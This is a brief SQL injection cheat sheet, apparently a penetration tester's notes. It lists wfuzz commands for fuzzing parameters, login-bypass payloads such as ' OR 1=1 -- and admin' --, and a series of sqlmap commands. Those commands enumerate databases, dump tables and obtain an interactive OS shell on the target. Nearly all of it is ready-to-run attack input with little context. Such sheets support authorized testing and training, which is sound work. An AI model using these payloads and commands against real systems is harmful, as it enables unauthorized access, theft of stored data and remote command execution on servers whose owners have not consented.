# **SQL Injection**

#### **Fuzzing**

- GET
```
wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -u "http://example.com/index.php?id=FUZZ"
```
- POST
```
wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d "db=mysql&id=FUZZ" -u "http://example.com"
```     

#### **Boolean Bypass**
Enter these into the username or password field to make the WHERE clause always true.

```
' OR '1'='1' --
' OR 1=1 --
" OR 1=1 --
admin' OR '1'='1
```

#### **Commenting Out Passwords**
Use SQL comment symbols to ignore the password check entirely.

```
MySQL/PostgreSQL: admin' --
MS SQL Server: admin' --
Oracle: admin' -- or admin'/*
```

#### **SQLmap**
```
sqlmap -u "http://example.com/blindsqli.php?user=1" -p user --threads=3

sqlmap -r request.txt --batch --flush-session --threads=3

sqlmap -r request.txt --dbms= "mssql" --batch --threads=3

sqlmap -r request.txt -p <vulnerable_param> --dbms= "mssql" --dbs --batch --threads=3

sqlmap -r request.txt --dbms= "mssql" --tables -D <DB_Name> --batch --threads=3

sqlmap -r login_post_req.txt -p id --dbms= "mssql" --tables -D strigi -T <Table_Name> --dump --batch --threads=3

sqlmap -r request.txt --dbms= "mysql" --tables -D <table name> --dump --batch --threads=3
```
##### **Testing for Blind SQL Injection**
```
sqlmap -r request.txt --technique=BLIND
```

- Obtain an interactive shell
```
sqlmap -r request.txt -p <vulnerable_param> --os-shell --web-root "/var/www/html/tmp" --batch
```